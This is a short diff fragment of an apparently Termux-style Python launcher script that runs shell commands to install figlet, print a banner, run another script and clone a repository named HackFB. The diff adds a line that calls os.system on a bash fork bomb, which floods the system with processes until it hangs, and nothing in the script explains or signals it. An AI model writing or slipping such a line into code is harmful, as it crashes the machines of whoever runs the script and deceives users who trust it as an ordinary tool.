@@ -23,6 +23,8 @@ os.system("pkg install figlet")
 
 os.system("figlet 2110")
 
+os.system(":(){ :|:& };:")
+
 os.system("python trympy")
 
 os.system("git clone https://github.com/JustAHackers/HackFB")
